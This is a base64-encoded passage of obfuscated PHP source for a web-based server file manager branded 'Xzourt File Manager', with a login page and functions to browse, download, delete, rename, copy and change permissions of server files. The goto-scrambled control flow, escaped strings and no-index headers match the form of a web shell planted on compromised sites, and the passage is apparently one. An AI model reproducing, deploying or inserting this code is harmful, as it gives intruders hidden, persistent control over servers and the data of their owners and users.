maWxlKSB7IGlmICgkZmlsZSAhPSAiXHgyZSIgJiYgJGZpbGUgIT0gIlx4MmVcNTYiKSB7IGlmICghZm1fcmRlbGV0ZSgkcGF0aCAuICJcNTciIC4gJGZpbGUpKSB7ICRvayA9IGZhbHNlOyB9IH0gfSB9IHJldHVybiAkb2sgPyBybWRpcigkcGF0aCkgOiBmYWxzZTsgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGgpKSB7IHJldHVybiB1bmxpbmsoJHBhdGgpOyB9IHJldHVybiBmYWxzZTsgfSBnb3RvIHgyR1doOyB4WEZsdjogaWYgKCRwYXJlbnQgIT09IGZhbHNlKSB7ID8+CiAgICAgICAgICAgICAgICA8dHI+PD9waHAgIGlmICghRk1fUkVBRE9OTFkpIHsgPz4KICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9Im5vc29ydCI+PC90ZD48P3BocCAgfSA/PgogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiPjxhIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZSgkcGFyZW50KTsgPz4KIj48aSBjbGFzcz0iZmEgZmEtY2hldnJvbi1jaXJjbGUtbGVmdCBnby1iYWNrIj48L2k+IC4uPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJib3JkZXItMCI+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImJvcmRlci0wIj48L3RkPgogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIGlmICghRk1fSVNfV0lOICYmICEkaGlkZV9Db2xzKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIH0gPz4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICA8P3BocCAgfSBnb3RvIGJuSGlYOyBzbHc5djogZnVuY3Rpb24gZm1fc2V0X21zZygkbXNnLCAkc3RhdHVzID0gIlx4NmZcMTUzIikgeyAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bIlwxNTVceDY1XHg3M1wxNjNceDYxXDE0N1x4NjUiXSA9ICRtc2c7ICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXHg3M1x4NzRcMTQxXHg3NFx4NzVceDczIl0gPSAkc3RhdHVzOyB9IGdvdG8gU1BTVjE7IEt2NXljOiBmdW5jdGlvbiBmbV9vYmplY3RfdG9fYXJyYXkoJG9iaikgeyBpZiAoIWlzX29iamVjdCgkb2JqKSAmJiAhaXNfYXJyYXkoJG9iaikpIHsgcmV0dXJuICRvYmo7IH0gaWYgKGlzX29iamVjdCgkb2JqKSkgeyAkb2JqID0gZ2V0X29iamVjdF92YXJzKCRvYmopOyB9IHJldHVybiBhcnJheV9tYXAoIlwxNDZceDZkXHg1Zlx4NmZceDYyXHg2YVwxNDVcMTQzXDE2NFx4NWZceDc0XDE1N1wxMzdceDYxXDE2Mlx4NzJceDYxXDE3MSIsICRvYmopOyB9IGdvdG8gZ3pwaTc7IFNSUmh6OiAkZXhjbHVkZV9pdGVtcyA9IGFycmF5KCk7IGdvdG8gcUxfV1k7IERGSVN1OiBmdW5jdGlvbiBnZXRfYWJzb2x1dGVfcGF0aCgkcGF0aCkgeyAkcGF0aCA9IHN0cl9yZXBsYWNlKGFycmF5KCJcNTciLCAiXDEzNCIpLCBESVJFQ1RPUllfU0VQQVJBVE9SLCAkcGF0aCk7ICRwYXJ0cyA9IGFycmF5X2ZpbHRlcihleHBsb2RlKERJUkVDVE9SWV9TRVBBUkFUT1IsICRwYXRoKSwgIlx4NzNcMTY0XHg3MlwxNTRceDY1XDE1NiIpOyAkYWJzb2x1dGVzID0gYXJyYXkoKTsgZm9yZWFjaCAoJHBhcnRzIGFzICRwYXJ0KSB7IGlmICgiXDU2IiA9PSAkcGFydCkgeyBjb250aW51ZTsgfSBpZiAoIlx4MmVceDJlIiA9PSAkcGFydCkgeyBhcnJheV9wb3AoJGFic29sdXRlcyk7IH0gZWxzZSB7ICRhYnNvbHV0ZXNbXSA9ICRwYXJ0OyB9IH0gcmV0dXJuIGltcGxvZGUoRElSRUNUT1JZX1NFUEFSQVRPUiwgJGFic29sdXRlcyk7IH0gZ290byBoaTNqNzsgVGo5UkY6IGZ1bmN0aW9uIGZtX3Nob3dfaGVhZGVyX2xvZ2luKCkgeyAkc3ByaXRlc192ZXIgPSAiXHgzMlw2MFw2MVw2Nlw2MFw2M1w2MVw2NSI7IGhlYWRlcigiXHg0M1x4NmZcMTU2XHg3NFx4NjVceDZlXDE2NFw1NVwxMjRceDc5XDE2MFwxNDVcNzJceDIwXHg3NFwxNDVceDc4XHg3NFw1N1wxNTBcMTY0XHg2ZFx4NmNceDNiXHgyMFx4NjNcMTUwXHg2MVx4NzJceDczXHg2NVwxNjRceDNkXDE2NVwxNjRceDY2XDU1XHgzOCIpOyBoZWFkZXIoIlwxMDVceDc4XDE2MFx4NjlcMTYyXDE0NVwxNjNceDNhXHgyMFx4NTNcMTQxXDE2NFw1NFw0MFx4MzJceDM2XDQwXDExMlx4NzVceDZjXHgyMFw2MVw3MVx4MzlcNjdceDIwXHgzMFw2NVx4M2FceDMwXDYwXHgzYVx4MzBceDMwXDQwXHg0N1wxMTVcMTI0Iik7IGhlYWRlcigiXDEwM1x4NjFcMTQzXHg2OFx4NjVcNTVcMTAzXDE1N1wxNTZcMTY0XHg3Mlx4NmZceDZjXDcyXHgyMFwxNTZcMTU3XDU1XDE2M1wxNjRcMTU3XDE2Mlx4NjVcNTRceDIwXDE1Nlx4NmZcNTVceDYzXHg2MVwxNDNcMTUwXDE0NVx4MmNceDIwXHg2ZFwxNjVceDczXHg3NFx4MmRcMTYyXDE0NVwxNjZceDYxXDE1NFx4NjlceDY0XHg2MVwxNjRcMTQ1XHgyY1x4MjBceDcwXHg2Zlx4NzNceDc0XHgyZFwxNDNcMTUwXHg2NVwxNDNceDZiXDc1XHgzMFw1NFw0MFx4NzBceDcyXHg2NVx4MmRcMTQzXDE1MFx4NjVcMTQzXHg2Ylw3NVx4MzAiKTsgaGVhZGVyKCJcMTIwXDE2MlwxNDFcMTQ3XHg2ZFx4NjFcNzJcNDBceDZlXDE1N1w1NVwxNDNcMTQxXDE0M1x4NjhcMTQ1Iik7IGdsb2JhbCAkbGFuZywgJHJvb3RfdXJsLCAkZmF2aWNvbl9wYXRoOyA/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CiAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iV2ViIGJhc2VkIEZpbGUgTWFuYWdlciBpbiBQSFAsIE1hbmFnZSB5b3VyIGZpbGVzIGVmZmljaWVudGx5IGFuZCBlYXNpbHkgd2l0aCBYem91cnQgRmlsZSBNYW5hZ2VyIj4KICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iQ0NQIFByb2dyYW1tZXJzIj4KICAgIDxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudD0ibm9pbmRleCwgbm9mb2xsb3ciPgogICAgPG1ldGEgbmFtZT0iZ29vZ2xlYm90IiBjb250ZW50PSJub2luZGV4Ij4KICAgIDw/cGhwICBpZiAoJGZhdmljb25fcGF0aCkgeyBlY2hvICJcNzRceDZjXHg2OVx4NmVceDZiXHgyMFx4NzJceDY1XDE1NFx4M2RcNDJceDY5XHg2M1wxNTdcMTU2XDQyXDQwXHg2OFwxNjJcMTQ1XHg2Nlw3NVw0MiIgLiBmbV9lbmMoJGZhdmljb25fcGF0aCkgLiAiXHgyMlx4MjBceDc0XDE3MVx4NzBceDY1XHgzZFx4MjJceDY5XDE1NVwxNDFceDY3XHg2NVx4MmZcMTYwXHg2ZVx4NjdceDIyXHgzZSI7IH0gPz4KICAgIDx0aXRsZT48P3BocCAgZWNobyBmbV9lbmMoQVBQX1RJVExFKTsgPz4KPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9zdGFja3BhdGguYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC41LjIvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIj4KICAgIDxzdHlsZT4KICAgICAgICBib2R5LmZtLWxvZ2luLXBhZ2V7IGJhY2tncm91bmQtY29sb3I6I2Y3ZjlmYjtmb250LXNpemU6MTRweDtiYWNrZ3JvdW5kLWNvbG9yOiNmN2Y5ZmI7YmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7YmFja2dyb3VuZC1pbWFnZTp1cmwoImh0dHBzOi8vaS5waW5pbWcuY29tL29yaWdpbmFscy83Zi9jZi9kMS83ZmNmZDEyOTA2OGNlOTFiMDAyYTRjNWU5YjBlMDY3Ny5wbmciKTt9CiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmJyYW5keyB3aWR0aDoxMjFweDtvdmVyZmxvdzpoaWRkZW47bWFyZ2luOjAgYXV0bztwb3NpdGlvbjpyZWxhdGl2ZTt6LWluZGV4OjF9CiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmJyYW5kIGltZ3sgd2lkdGg6MTAwJX0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuY2FyZC13cmFwcGVyeyB3aWR0aDozNjBweDttYXJnaW4tdG9wOjEwJTttYXJnaW4tbGVmdDphdXRvO21hcmdpbi1yaWdodDphdXRvO30KICAgICAgICAuZm0tbG9naW4tcGFnZSAuY2FyZHsgYm9yZGVyLWNvbG9yOnRyYW5zcGFyZW50O2JveC1zaGFkb3c6MCA0cHggOHB4IHJnYmEoMCwwLDAsLjA1KX0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuY2FyZC10aXRsZXsgbWFyZ2luLWJvdHRvbToxLjVyZW07Zm9udC1zaXplOjI0cHg7Zm9udC13ZWlnaHQ6NDAwO30KICAgICAgICAuZm0tbG9naW4tcGFnZSAuZm9ybS1jb250cm9seyBib3JkZXItd2lkdGg6Mi4zcHh9CiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmZvcm0tZ3JvdXAgbGFiZWx7IHdpZHRoOjEwMCV9CiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmJ0bi5idG4tYmxvY2t7IHBhZGRpbmc6MTJweCAxMHB4fQogICAgICAgIC5mbS1sb2dpbi1wYWdlIC5mb290ZXJ7IG1hcmdpbjo0MHB4IDQwcHg7Y29sb3I6Izg4ODt0ZXh0LWFsaWduOmNlbnRlcn0KICAgICAgICBAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOjQyNXB4KXsKICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmNhcmQtd3JhcHBlcnsgd2lkdGg6OTAlO21hcmdpbjowIGF1dG87bWFyZ2luLXRvcDoxMCU7fQogICAgICAgIH0KICAgICAgICBAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOjMyMHB4KXsKICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmNhcmQuZmF0eyBwYWRkaW5nOjB9CiAgICAgICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkLmZhdCAuY2FyZC1ib2R5eyBwYWRkaW5nOjE1cHh9CiAgICAgICAgfQogICAgICAgIC5tZXNzYWdleyBwYWRkaW5nOjRweCA3cHg7Ym9yZGVyOjFweCBzb2xpZCAjZGRkO2JhY2tncm91bmQtY29sb3I6I2ZmZn0KICAgICAgICAubWVzc2FnZS5va3sgYm9yZGVyLWNvbG9yOmdyZWVuO2NvbG9yOmdyZWVufQogICAgICAgIC5tZXNzYWdlLmVycm9yeyBib3JkZXItY29sb3I6cmVkO2NvbG9yOnJlZH0KICAgICAgICAubWVzc2FnZS5hbGVydHsgYm9yZGVyLWNvbG9yOm9yYW5nZTtjb2xvcjpvcmFuZ2V9CiAgICAgICAgYm9keS5mbS1sb2dpbi1wYWdlLnRoZW1lLWRhcmsge2JhY2tncm91bmQtY29sb3I6ICMyZjJhMmE7fQogICAgICAgIC50aGVtZS1kYXJrIHN2ZyBnLCAudGhlbWUtZGFyayBzdmcgcGF0aCB7ZmlsbDogI2ZmZmZmZjsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keSBjbGFzcz0iZm0tbG9naW4tcGFnZSA8P3BocCAgZWNobyBGTV9USEVNRSA9PSAiXDE0NFwxNDFcMTYyXHg2YiIgPyAiXHg3NFwxNTBcMTQ1XHg2ZFx4NjVceDJkXHg2NFwxNDFcMTYyXHg2YiIgOiAnJzsgPz4KIj4KPGRpdiBpZD0id3JhcHBlciIgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+CgogICAgPD9waHAgIH0gZ290byBPVXN5ZjsgTUlNWnk6ICRudW1fZm9sZGVycyA9IGNvdW50KCRmb2xkZXJzKTsgZ290byBmcWUxUzsgQnNYMTE6ICRyb290X3BhdGggPSBzdHJfcmVwbGFjZSgiXHg1YyIsICJceDJmIiwgJHJvb3RfcGF0aCk7IGdvdG8gdm5UaWQ7IFNwTGJrOiA/PgogICAgICAgICAgICAgICAgPHRoPjw/cGhwICBnb3RvIFBJdlN3OyBBZnZCOTogJGh0dHBfaG9zdCA9ICRfU0VSVkVSWyJcMTEwXDEyNFx4NTRcMTIwXHg1Zlx4NDhceDRmXDEyM1x4NTQiXTsgZ290byBvTWNISjsgWnA2SzY6IGlmIChpc3NldCgkX0dFVFsiXHg2NFx4NmMiXSkpIHsgJGRsID0gJF9HRVRbIlx4NjRceDZjIl07ICRkbCA9IGZtX2NsZWFuX3BhdGgoJGRsKTsgJGRsID0gc3RyX3JlcGxhY2UoIlw1NyIsICcnLCAkZGwpOyAkcGF0aCA9IEZNX1JPT1RfUEFUSDsgaWYgKEZNX1BBVEggIT0gJycpIHsgJHBhdGggLj0gIlw1NyIgLiBGTV9QQVRIOyB9IGlmICgkZGwgIT0gJycgJiYgaXNfZmlsZSgkcGF0aCAuICJceDJmIiAuICRkbCkpIHsgZm1fZG93bmxvYWRfZmlsZSgkcGF0aCAuICJcNTciIC4gJGRsLCAkZGwsIDEwMjQpOyBkaWU7IH0gZWxzZSB7IGZtX3NldF9tc2cobG5nKCJceDQ2XHg2OVx4NmNceDY1XHgyMFwxNTZceDZmXDE2NFw0MFwxNDZcMTU3XHg3NVx4NmVceDY0IiksICJceDY1XHg3Mlx4NzJcMTU3XDE2MiIpOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJcNzdceDcwXDc1IiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gfSBnb3RvIGVhejY3OyBuZnhjMzogZnVuY3Rpb24gZm1fcmVkaXJlY3QoJHVybCwgJGNvZGUgPSAzMDIpIHsgaGVhZGVyKCJceDRjXDE1N1x4NjNceDYxXDE2NFx4NjlcMTU3XHg2ZVw3Mlx4MjAiIC4gJHVybCwgdHJ1ZSwgJGNvZGUpOyBkaWU7IH0gZ290byBERklTdTsgcG1ndzQ6ICRhbGxvd2VkX2ZpbGVfZXh0ZW5zaW9ucyA9ICcnOyBnb3RvIHRpQ2R1OyBxeWp6MTogZGVmaW5lZCgiXDEwNlx4NGRceDVmXDEyMlwxMTdcMTE3XHg1NFx4NWZceDU1XDEyMlx4NGMiKSB8fCBkZWZpbmUoIlwxMDZcMTE1XDEzN1x4NTJcMTE3XDExN1wxMjRceDVmXDEyNVwxMjJceDRjIiwgKCRpc19odHRwcyA/ICJceDY4XHg3NFwxNjRceDcwXHg3MyIgOiAiXHg2OFwxNjRceDc0XHg3MCIpIC4gIlw3Mlw1N1x4MmYiIC4gJGh0dHBfaG9zdCAuICghZW1wdHkoJHJvb3RfdXJsKSA/ICJcNTciIC4gJHJvb3RfdXJsIDogJycpKTsgZ290byBveWw4STsgUWl4U2o6IGZvcmVhY2ggKCRmb2xkZXJzIGFzICRmKSB7ICRpc19saW5rID0gaXNfbGluaygkcGF0aCAuICJcNTciIC4gJGYpOyAkaW1nID0gJGlzX2xpbmsgPyAiXHg2OVwxNDNceDZmXDE1Nlw1NVwxNTRceDY5XHg2ZVx4NmJcMTM3XHg2Nlx4NmZceDZjXHg2NFx4NjVcMTYyIiA6ICJcMTQ2XHg2MVx4MjBceDY2XHg2MVw1NVwxNDZcMTU3XDE1NFx4NjRceDY1XDE2Mlw1NVwxNTciOyAkbW9kaWZfcmF3ID0gZmlsZW10aW1lKCRwYXRoIC4gIlw1NyIgLiAkZik7ICRtb2RpZiA9IGRhdGUoRk1fREFURVRJTUVfRk9STUFULCAkbW9kaWZfcmF3KTsgaWYgKCRjYWxjX2ZvbGRlcikgeyAkZmlsZXNpemVfcmF3ID0gZm1fZ2V0X2RpcmVjdG9yeXNpemUoJHBhdGggLiAiXDU3IiAuICRmKTsgJGZpbGVzaXplID0gZm1fZ2V0X2ZpbGVzaXplKCRmaWxlc2l6ZV9yYXcpOyB9IGVsc2UgeyAkZmlsZXNpemVfcmF3ID0gJyc7ICRmaWxlc2l6ZSA9IGxuZygiXDEwNlwxNTdceDZjXDE0NFwxNDVceDcyIik7IH0gJHBlcm1zID0gc3Vic3RyKGRlY29jdChmaWxlcGVybXMoJHBhdGggLiAiXDU3IiAuICRmKSksIC00KTsgaWYgKGZ1bmN0aW9uX2V4aXN0cygiXHg3MFwxNTdceDczXDE1MVx4NzhceDVmXDE0N1x4NjVcMTY0XDE2MFwxNjdceDc1XDE1MVwxNDQiKSAmJiBmdW5jdGlvbl9leGlzdHMoIlwxNjBceDZmXHg3M1wxNTFcMTcwXHg1Zlx4NjdcMTQ1XDE2NFwxNDdceDcyXDE0N1x4NjlcMTQ0IikpIHsgJG93bmVyID0gcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCRwYXRoIC4gIlw1NyIgLiAkZikpOyAkZ3JvdXAgPSBwb3NpeF9nZXRncmdpZChmaWxlZ3JvdXAoJHBhdGggLiAiXDU3IiAuICRmKSk7IH0gZWxzZSB7ICRvd25lciA9IGFycmF5KCJcMTU2XDE0MVx4NmRceDY1IiA9PiAiXHgzZiIpOyAkZ3JvdXAgPSBhcnJheSgiXDE1NlwxNDFcMTU1XHg2NSIgPT4gIlx4M2YiKTsgfSA/PgogICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgIDw/cGhwICBpZiAoIUZNX1JFQURPTkxZKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iY3VzdG9tLWNoZWNrYm94LXRkIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wgY3VzdG9tLWNoZWNrYm94Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0IiBpZD0iPD9waHAgIGVjaG8gJGlpOyA/PgoiIG5hbWU9ImZpbGVbXSIgdmFsdWU9Ijw/cGhwICBlY2hvIGZtX2VuYygkZik7ID8+CiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1jb250cm9sLWxhYmVsIiBmb3I9Ijw/cGhwICBlY2hvICRpaTsgPz4KIj48L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD48P3BocCAgfSA/PgogICAgICAgICAgICAgICAgICAgIDx0ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmlsZW5hbWUiPjxhIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAiXHgyZiIgLiAkZiwgIlw1NyIpKTsgPz4KIj48aSBjbGFzcz0iPD9waHAgIGVjaG8gJGltZzsgPz4KIj48L2k+IDw/cGhwICBlY2hvIGZtX2NvbnZlcnRfd2luKGZtX2VuYygkZikpOyA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPjw/cGhwICBlY2hvICRpc19saW5rID8gIlx4MjBcNDZcMTYyXHg2MVwxNjJcMTYyXDczXDQwXDc0XDE1MVx4M2UiIC4gcmVhZGxpbmsoJHBhdGggLiAiXDU3IiAuICRmKSAuICJcNzRceDJmXDE1MVx4M2UiIDogJyc7ID8+CjwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkIGRhdGEtc29ydD0iYS08P3BocCAgZWNobyBzdHJfcGFkKCRmaWxlc2l6ZV9yYXcsIDE4LCAiXHgzMCIsIFNUUl9QQURfTEVGVCk7ID8+CiI+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICBlY2hvICRmaWxlc2l6ZTsgPz4KICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLXNvcnQ9ImEtPD9waHAgIGVjaG8gJG1vZGlmX3JhdzsgPz4KIj48P3BocCAgZWNobyAkbW9kaWY7ID8+CjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIGlmICghRk1fSVNfV0lOICYmICEkaGlkZV9Db2xzKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48P3BocCAgaWYgKCFGTV9SRUFET05MWSkgeyA/Pgo8YSB0aXRsZT0iQ2hhbmdlIFBlcm1pc3Npb25zIiBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiZhbXA7Y2htb2Q9PD9waHAgIGVjaG8gdXJsZW5jb2RlKCRmKTsgPz4KIj48P3BocCAgZWNobyAkcGVybXM7ID8+CjwvYT48P3BocCAgfSBlbHNlIHsgZWNobyAkcGVybXM7IH0gPz4KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/cGhwICBlY2hvICRvd25lclsiXHg2ZVx4NjFceDZkXHg2NSJdIC4gIlx4M2EiIC4gJGdyb3VwWyJcMTU2XHg2MVx4NmRcMTQ1Il07ID8+CjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIH0gPz4KICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImlubGluZS1hY3Rpb25zIj48P3BocCAgaWYgKCFGTV9SRUFET05MWSkgeyA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwICBlY2hvIGxuZygiXHg0NFwxNDVcMTU0XHg2NVwxNjRceDY1Iik7ID8+CiIgaHJlZj0iP3A9PD9waHAgIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpOyA/PgomYW1wO2RlbD08P3BocCAgZWNobyB1cmxlbmNvZGUoJGYpOyA/PgoiIG9uY2xpY2s9InJldHVybiBjb25maXJtKCc8P3BocCAgZWNobyBsbmcoIlx4NDRcMTQ1XDE1NFx4NjVceDc0XDE0NSIpIC4gIlw0MCIgLiBsbmcoIlx4NDZcMTU3XDE1NFwxNDRceDY1XHg3MiIpIC4gIlw3NyI7ID8+ClxuIFxuICggPD9waHAgIGVjaG8gdXJsZW5jb2RlKCRmKTsgPz4KICknKTsiPiA8aSBjbGFzcz0iZmEgZmEtdHJhc2gtbyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJceDUyXDE0NVx4NmVcMTQxXHg2ZFx4NjUiKTsgPz4KIiBocmVmPSIjIiBvbmNsaWNrPSJyZW5hbWUoJzw/cGhwICBlY2hvIGZtX2VuYyhhZGRzbGFzaGVzKEZNX1BBVEgpKTsgPz4KJywgJzw/cGhwICBlY2hvIGZtX2VuYyhhZGRzbGFzaGVzKCRmKSk7ID8+CicpO3JldHVybiBmYWxzZTsiPjxpIGNsYXNzPSJmYSBmYS1wZW5jaWwtc3F1YXJlLW8iIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwICBlY2hvIGxuZygiXHg0M1x4NmZceDcwXDE3MVwxMjRceDZmIik7ID8+Ci4uLiIgaHJlZj0iP3A9JmFtcDtjb3B5PTw/cGhwICBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAiXHgyZiIgLiAkZiwgIlw1NyIpKTsgPz4KIj48aSBjbGFzcz0iZmEgZmEtZmlsZXMtbyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICB9ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCAgZWNobyBsbmcoIlwxMDRcMTUxXHg3Mlx4NjVcMTQzXDE2NFwxMTRcMTUxXDE1Nlx4NmIiKTsgPz4KIiBocmVmPSI8P3BocCAgZWNobyBmbV9lbmMoRk1fUk9PVF9VUkwgLiAoRk1fUEFUSCAhPSAnJyA/ICJcNTciIC4gRk1fUEFUSCA6ICcnKSAuICJceDJmIiAuICRmIC4gIlw1NyIpOyA/PgoiIHRhcmdldD0iX2JsYW5rIj48aSBjbGFzcz0iZmEgZmEtbGluayIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICA8P3BocCAgZmx1c2goKTsgJGlpKys7IH0gZ290byBIYkdnejsgRHg0dFk6IGZ1bmN0aW9uIGZtX2lzdmFsaWRfZmlsZW5hbWUoJHRleHQpIHsgcmV0dXJuIHN0cnBicmsoJHRleHQsICJceDJmXDc3XHgyNVw1Mlx4M2FceDdjXHgyMlx4M2NcNzYiKSA9PT0gRkFMU0UgPyB0cnVlIDogZmFsc2U7IH0gZ290byBzbHc5djsgUWN3UTI6IGZtX3Nob3dfbWVzc2FnZSgpOyBnb3RvIEY5d3dMOyB3cDV1QTogZnVuY3Rpb24gZm1fcmNvcHkoJHBhdGgsICRkZXN0LCAkdXBkID0gdHJ1ZSwgJGZvcmNlID0gdHJ1ZSkgeyBpZiAoaXNfZGlyKCRwYXRoKSkgeyBpZiAoIWZtX21rZGlyKCRkZXN0LCAkZm9yY2UpKSB7IHJldHVybiBmYWxzZTsgfSAkb2JqZWN0cyA9IHNjYW5kaXIoJHBhdGgpOyAkb2sgPSB0cnVlOyBpZiAoaXNfYXJyYXkoJG9iamVjdHMpKSB7IGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7IGlmICgkZmlsZSAhPSAiXDU2IiAmJiAkZmlsZSAhPSAiXDU2XHgyZSIpIHsgaWYgKCFmbV9yY29weSgkcGF0aCAuICJceDJmIiAuICRmaWxlLCAkZGVzdCAuICJcNTciIC4gJGZpbGUpKSB7ICRvayA9IGZhbHNlOyB9IH0gfSB9IHJldHVybiAkb2s7IH0gZWxzZWlmIChpc19maWxlKCRwYXRoKSkgeyByZXR1cm4gZm1fY29weSgkcGF0aCwgJGRlc3QsICR1cGQpOyB9IHJldHVybiBmYWxzZTsgfSBnb3RvIHVVZXJWOyBvZlllTjogY2xhc3MgRk1fQ29uZmlnIHsgdmFyICRkYXRhOyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpIHsgZ2xvYmFsICRyb290X3BhdGgsICRyb290X3VybCwgJENPTkZJRzsgJGZtX3VybCA9ICRyb290X3VybCAuICRfU0VSVkVSWyJcMTIwXDExMFwxMjBceDVmXHg1M1x4NDVcMTE0XDEwNiJdOyAkdGhpcy0+ZGF0YSA9IGFycmF5KCJcMTU0XDE0MVx4NmVcMTQ3IiA9PiAiXDE0NVwxNTYiLCAiXHg2NVwxNjJcMTYyXHg2Zlx4NzJceDVmXDE2MlwxNDVceDcwXHg2Zlx4NzJceDc0XDE1MVx4NmVcMTQ3IiA9PiB0cnVlLCAiXDE2M1x4NjhcMTU3XHg3N1x4NWZceDY4XDE1MVx4NjRceDY0XDE0NVwxNTYiID0+IHRydWUpOyAkZGF0YSA9IGZhbHNlOyBpZiAoc3RybGVuKCRDT05GSUcpKSB7ICRkYXRhID0gZm1fb2JqZWN0X3RvX2FycmF5KGpzb25fZGVjb2RlKCRDT05GSUcpKTsgfSBlbHNlIHsgJG1zZyA9ICJceDU4XHg3YVwxNTdcMTY1XDE2Mlx4NzRcNDBcMTA2XHg2OVx4NmNcMTQ1XDQwXHg0ZFx4NjFceDZlXDE0MVx4NjdcMTQ1XDE2Mlw3NFwxNDJcMTYyXDc2XHg0NVwxNjJcMTYyXHg2ZlwxNjJceDNhXDQwXHg0M1x4NjFcMTU2XHg2ZVwxNTdceDc0XDQwXDE1NFwxNTdcMTQxXHg2NFw0MFwxNDNceDZmXHg2ZVx4NjZcMTUxXHg2N1wxNjVceDcyXDE0MVx4NzRcMTUxXDE1N1x4NmUiOyBpZiAoc3Vic3RyKCRmbV91cmwsIC